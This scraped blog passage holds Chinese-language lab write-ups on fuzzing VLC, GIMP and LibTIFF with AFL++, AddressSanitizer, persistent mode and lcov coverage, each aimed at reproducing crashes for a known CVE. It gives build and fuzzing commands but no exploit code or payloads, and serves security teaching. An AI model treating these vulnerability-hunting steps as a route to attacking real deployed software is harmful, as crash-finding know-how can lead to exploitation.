<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">make vlc-demux-run -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8c630391-698e-495d-ae8b-520a844d8999" alt="image"></p>
<p>由于该错误存在于ASF解模中，所以调用<strong>vlc_demux_process_memory</strong>函数。这个函数尝试删除先前存储在内存中的数据缓冲区。可以在这里找到代码修改(.&#x2F;fuzzing_harness.patch)</p>
<h5 id="5、部分仪器化"><a href="#5、部分仪器化" class="headerlink" title="5、部分仪器化"></a>5、部分仪器化</h5><p>一开始，尝试只包括ASF拆模所涉及的文件名。不幸的是，这种方法不起作用。似乎文件名匹配是<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/issues/1018#issuecomment-879045408">并不总是可能的</a>，所以选择了一个混合的方法，包括函数匹配和文件名匹配</p>
<p>可以下载部分检测文件(.&#x2F;Partial_instrumentation)</p>
<h5 id="6、小改动"><a href="#6、小改动" class="headerlink" title="6、小改动"></a>6、小改动</h5><p>为了加快ASF模糊测试的速度，建议将这个补丁应用到<strong>modules&#x2F;demux&#x2F;libasf.c</strong> (目前没有更多的线索;)):[speeup .patch](.&#x2F; speeup .patch)</p>
<h5 id="7、fuzzing"><a href="#7、fuzzing" class="headerlink" title="7、fuzzing"></a>7、fuzzing</h5><p>使用<strong>afl-clang-fast</strong>作为编译器并启用ASAN构建VLC的时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=&quot;afl-clang-fast&quot; CXX=&quot;afl-clang-fast++&quot; ./configure --prefix=&quot;$HOME/fuzzing_vlc/vlc-3.0.7.1/install&quot; --disable-a52 --disable-lua --disable-qt --with-sanitizer=address</span><br><span class="line">AFL_LLVM_ALLOWLIST=$HOME/fuzzing_vlc/vlc-3.0.7.1/Partial_instrumentation make -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/75b90691-fdd0-4623-959a-509166ccf415" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8805c9e9-c6df-49bc-95e8-4100fa926990" alt="image"></p>
<p>构建模糊控制装置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd test</span><br><span class="line">make vlc-demux-run -j$(nproc) LDFLAGS=&quot;-fsanitize=address&quot;</span><br><span class="line">cd ..  </span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7375cb28-c429-4fcb-8f73-86377f36c6c9" alt="image"></p>
<p>运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -t 100 -m none -i &#x27;./afl_in&#x27; -o &#x27;./afl_out&#x27; -x asf_dictionary.dict -D -M master -- ./test/vlc-demux-run @@    </span><br></pre></td></tr></table></figure>

<p>注意事项：超时参数严重依赖于计算机，需要调整这个值</p>
<p>过一段时间，可以看到多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/378225ea-06c2-4351-a815-85f48b7a257c" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230802153658669.png" alt="image-20230802153658669"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/63ee9621-c317-45f4-b390-4628ce9960a5" alt="Image1"></p>
<h5 id="8、Triage"><a href="#8、Triage" class="headerlink" title="8、Triage"></a>8、Triage</h5><p>ASan跟踪可能看起来像</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/21e1a6e2-dd80-41fb-8660-8646c6502027" alt="image3"></p>
<h5 id="9、修复问题"><a href="#9、修复问题" class="headerlink" title="9、修复问题"></a>9、修复问题</h5><p>修复这两个bug后重建目标，并检查PoC不再使程序崩溃</p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2019-14776</strong>漏洞，学会如何使用部分仪器只对程序的相关部分进行仪器检测，如何编写模糊测试工具来更有效地测试大型应用程序</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/" data-id="clktgz1j70000p8vff6fg5aw8" data-title="Exercise 7 - VLC Media Player" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 6 - GIMP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/31/Exercise%206%20-%20GIMP/" class="article-date">
  <time class="dt-published" datetime="2023-07-31T15:09:51.000Z" itemprop="datePublished">2023-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/31/Exercise%206%20-%20GIMP/">Exercise 6 - GIMP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-6-GIMP"><a href="#Exercise-6-GIMP" class="headerlink" title="Exercise 6 - GIMP"></a>Exercise 6 - GIMP</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2016-4994</strong>是一个可以通过精心制作的XCF文件触发的Use-After-Free漏洞。当程序在释放指针后继续使用指针时，会发生释放错误。这可能会产生许多不良后果，从破坏有效数据到执行任意代码。</p>
<p>Use-After-Free漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/416.html%EF%BC%89">https://cwe.mitre.org/data/definitions/416.html）</a></p>
<p><strong>持久模式</strong></p>
<p>AFL持久模式基于进程内fuzzers: fuzzers利用单个进程，将代码注入目标进程并更改内存中的输入值。full -fuzz支持一种工作模式，它结合了进程内模糊测试的优点和更传统的多进程工具的健壮性:持久模式。在持久模式下，afl++在单个分叉进程中对目标进行多次模糊处理，而不是为每次执行模糊处理都创建一个新进程。该模式可将模糊测试速度提高20倍。</p>
<p>目标的基本结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Program initialization</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">10000</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Read input data. */</span></span><br><span class="line">  <span class="comment">/* Call library code to be fuzzed. */</span></span><br><span class="line">  <span class="comment">/* Reset state. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//End of fuzzing</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>afl++持久模式（<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md%EF%BC%89">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>GIMP</strong>图像编辑器。目标是在GIMP 2.8.16中找到<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2016-4994/"><strong>CVE-2016-4994</strong></a>的崩溃&#x2F;PoC</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir Fuzzing_gimp &amp;&amp; cd Fuzzing_gimp</span><br></pre></td></tr></table></figure>

<p>安装依赖项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/217f1d72-3f11-43e0-9349-19b3054e39eb" alt="image"></p>
<p>下载并构建GEGL 0.2(通用图形库)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.0.tar.bz2</span><br><span class="line">tar xvf gegl-0.2.0.tar.bz2 &amp;&amp; cd gegl-0.2.0</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7710b53d-1f28-46cf-a759-2803dea33a20" alt="image"></p>
<p>对源代码做两个小的修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g&#x27; ./operations/external/ff-load.c</span><br><span class="line">sed -i &#x27;s/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g&#x27; ./operations/external/ff-load.c</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/61453004-8215-4515-8959-64901b51e1b1" alt="image"></p>
<p>构建并安装Gegl-0.2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-debug --disable-glibtest  --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack</span><br><span class="line">make -j$(nproc)</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/479ad11c-4518-4158-bd26-53fec0919074" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/79ecb2c0-d77b-4d0e-8ce4-d28785d0281d" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5b931164-daf3-4b97-99c2-3156517b3316" alt="image"></p>
<p>如果在测试阶段看到一些错误消息，不要担心</p>
<p>下载并解压GIMP 2.8.16</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2</span><br><span class="line">tar xvf gimp-2.8.16.tar.bz2 &amp;&amp; cd gimp-2.8.16/</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/68a0cc96-6440-4ca5-9810-e46f600528a0" alt="image"></p>
<p>使用<strong>afl-clang-lto</strong>作为编译器构建GIMP的时间(可能需要一些时间)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/Fuzzing_gimp/gegl-0.2.0/ CFLAGS=&quot;-fsanitize=address&quot; CXXFLAGS=&quot;-fsanitize=address&quot; LDFLAGS=&quot;-fsanitize=address&quot; ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug  --prefix=&quot;$HOME/Fuzzing_gimp/gimp-2.8.16/install&quot;</span><br><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7754716a-60de-46b1-af94-c913d0b9b755" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8444d9b-6d99-493d-ad19-6e122e7df54d" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e9dd7b26-9d03-4858-a63b-f8d00eb9d7c0" alt="image"></p>
<h5 id="2、持久模式"><a href="#2、持久模式" class="headerlink" title="2、持久模式"></a>2、持久模式</h5><p>有两种非常简单的方法:</p>
<p>第一个是修改’ ‘ app.c ‘ ‘文件，并将AFL_LOOP宏包含到for循环中</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e9138ee-cef7-47f5-8142-8052da800b8f" alt="image"></p>
<p>第二种方法是在’ ‘ xcf_load_invoker ‘ ‘函数中插入AFL_LOOP宏</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db175fdb-b8f9-471d-aaf2-528ecf976409" alt="Image1"></p>
<p>虽然第一个允许我们针对不同的输入格式，第二个更快，我们将有更多的机会抓住错误。</p>
<p>下载第二个补丁<a href="./persistent.patch">在这里</a></p>
<h5 id="2、种子语料库创建"><a href="#2、种子语料库创建" class="headerlink" title="2、种子语料库创建"></a>2、种子语料库创建</h5><p>建议创建多个GIMP项目并保存它们以获得多个.xcf示例，或者，可以将<a href="./SampleInput.xcf">SampleInput.xcf</a>文件复制到您的AFL输入文件夹中</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1dfc8ce-710f-4388-8d79-4f2c7bde4348" alt="image"></p>
<h5 id="3、fuzzing"><a href="#3、fuzzing" class="headerlink" title="3、fuzzing"></a>3、fuzzing</h5><p>由于该漏洞影响GIMP核心，可以通过删除不需要的插件来节省一些启动时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm ./install/lib/gimp/2.0/plug-ins/*</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/668873ab-07d5-4def-8f4a-36718cb804f0" alt="image"></p>
<p>使用以下命令运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i &#x27;./afl_in&#x27; -o &#x27;./afl_out&#x27; -D -t 100 -- ./install/bin/gimp-console-2.8 --verbose -d -f @@</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed1854d4-10f8-455f-8dfc-d67ee8c55b84" alt="image"></p>
<p>笔记:</p>
<ul>
<li>gimp-console-2.8是GIMP的控制台版本</li>
<li>我建议启用确定性突变（-D）</li>
<li>代码中还有一个无限循环的bug，所以我们需要设置一个较低的超时限制(例如-t 100)。此超时限制取决于您的机器功能，因此您需要根据具体情况对其进行调整</li>
</ul>
<p>几分钟后可以看见有多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/776dba22-7ddd-4db1-a53a-324e1e44729d" alt="Image2"></p>
<h5 id="4、Triage"><a href="#4、Triage" class="headerlink" title="4、Triage"></a>4、Triage</h5><p>ASan跟踪可能看起来像</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/be32a51f-edc7-4284-9563-1c4bf26ae496" alt="image3"></p>
<h5 id="5、修复问题"><a href="#5、修复问题" class="headerlink" title="5、修复问题"></a>5、修复问题</h5><p>修复这两个bug后重建目标，并检查PoC不再使程序崩溃</p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2016-4994</strong>漏洞，学会如何使用持久模式加快模糊测试，如何模糊交互&#x2F; GUI应用程序</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/31/Exercise%206%20-%20GIMP/" data-id="clktgz1jj0001p8vf984d33bg" data-title="Exercise 6 - GIMP" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 4 - LibTIFF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/29/Exercise%204%20-%20LibTIFF/" class="article-date">
  <time class="dt-published" datetime="2023-07-29T12:03:56.000Z" itemprop="datePublished">2023-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/29/Exercise%204%20-%20LibTIFF/">Exercise 4 - LibTIFF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-4-LibTIFF"><a href="#Exercise-4-LibTIFF" class="headerlink" title="Exercise 4 - LibTIFF"></a>Exercise 4 - LibTIFF</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2016-9297</strong>是一个越界读取漏洞，可以通过制作TIFF_SETGET_C16ASCII或TIFF_SETGET_C32_ASCII标签值触发。越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>LibTIFF</strong>图像库，在libtiff 4.0.4中找到<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2016-9297/"><strong>CVE-2016-9297</strong></a>漏洞&#x2F;PoC，以测量崩溃&#x2F;PoC的代码覆盖数据</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tiff &amp;&amp; cd fuzzing_tiff/</span><br></pre></td></tr></table></figure>

<p>下载并解压libtiff 4.0.4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz</span><br><span class="line">tar -xzvf tiff-4.0.4.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9291b692-50f9-4453-bf58-24c524d9607c" alt="image"></p>
<p>构建并安装libtiff</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd tiff-4.0.4/</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e3eec16-353a-479d-98d4-c9c87564ad5e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/951ec19d-b751-4e5b-a68e-f0d650c65d64" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/272999fa-1623-49fb-ac98-4f47afae76b1" alt="image"></p>
<p>作为目标二进制，可以模糊’ ‘ tiffinfo ‘ ‘二进制位于’ ‘ &#x2F;bin ‘ ‘文件夹，使用’ ‘ &#x2F;test&#x2F;images&#x2F; ‘ ‘文件夹中的示例图像作为种子输入语料库。</p>
<p>测试工作是否正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span><br></pre></td></tr></table></figure>

<p>看到如下页面说明正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3c61fc6b-be71-4a36-a358-144d5ef0616d" alt="image"></p>
<p>在最后一个命令行中，启用了所有这些标志:”-j -c -r -s -w”。这是为了提高代码覆盖率，增加发现bug的机会。</p>
<p>但是我们如何度量给定输入情况的代码覆盖率呢?</p>
<h5 id="2、代码覆盖率"><a href="#2、代码覆盖率" class="headerlink" title="2、代码覆盖率"></a>2、代码覆盖率</h5><p>代码覆盖率是一个软件度量，显示每行代码被触发的次数。通过使用代码覆盖率，我们将了解哪些部分的代码已经被模糊器到达，并可视化模糊过程。</p>
<p>安装lcov</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lcov</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b0a9dc5-650e-4803-9ca9-e36026a2661d" alt="image"></p>
<p>用“——coverage”标志重新构建libTIFF(编译器和链接器)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tiff/install</span><br><span class="line">cd $HOME/fuzzing_tiff/tiff-4.0.4/</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d433cee5-46a3-49f4-8167-77410b2df996" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9d6aa61c-41b2-42ed-bcf9-e20ecf36d270" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a421a445-6681-4da9-9ffe-9dd902ddb3a7" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d7329e66-432f-4b83-b471-0fbefd78454f" alt="image"></p>
<p>通过输入以下代码来收集代码覆盖率数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tiff/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info</span><br><span class="line">$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c7110cb6-9ea8-42b6-9d41-c45f5d80f90c" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1c3dbde4-b2dc-4fff-90df-28af3a8030a6" alt="image"></p>
<p>每一个命令的解释:</p>
<ul>
<li><code>lcov --zerocounters --directory ./</code> : 重置之前的计数器</li>
<li><code>lcov --capture --initial --directory ./ --output-file app.info</code> : 返回“基线”覆盖率数据文件，该文件包含每个测量行的零覆盖率</li>
<li><code>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</code> : 运行需要分析的应用程序，可以使用不同的输入多次运行它</li>
<li><code>lcov --no-checksum --directory ./ --capture --output-file app2.info</code>: 将当前覆盖状态保存到app2.info文件中</li>
</ul>
<p>最后，生成HTML输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cce49fe6-c4cf-4399-8e8b-93192e7f0ed2" alt="image"></p>
<p>如果一切顺利，代码覆盖率报告将在“html-coverage”文件夹中创建。只要打开<code>./html-coverage/index.html</code>文件，可以看到如下内容</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ac681a9e-0274-4858-9968-aa026d149254" alt="image"></p>
<p>可以浏览不同的文件夹和文件，并查看每行执行的次数</p>
<h5 id="3、fuzzing"><a href="#3、fuzzing" class="headerlink" title="3、fuzzing"></a>3、fuzzing</h5><p>要编译启用了ASAN的libtiff</p>
<p>首先，要清理所有之前编译过的目标文件和可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tiff/install</span><br><span class="line">cd $HOME/fuzzing_tiff/tiff-4.0.4/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/09a2593d-14da-4ac8-af56-c8da612bbc1e" alt="image"></p>
<p>调用make之前设置AFL_USE_ASAN&#x3D;1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make -j4</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/11b06f56-0bfc-4cec-9edf-facbfe023453" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7600f523-f6ee-4865-b184-2e2ac0801bb5" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db8de18a-f4fd-4e20-ba92-df2997d3d018" alt="image"></p>
<p>使用以下命令运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/fuzzing_tiff/tiff-4.0.4/test/images/ -o $HOME/fuzzing_tiff/out/ -s 123 -- $HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure>

<p>几分钟后可以看见有多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/810f991e-914f-4399-be93-bebb5a8d3d3f" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2a43fc75-44f5-4e70-875d-b12e612e0bd3" alt="image"></p>
<h5 id="4、Triage"><a href="#4、Triage" class="headerlink" title="4、Triage"></a>4、Triage</h5><p>ASan跟踪可能看起来如下图所示</p>
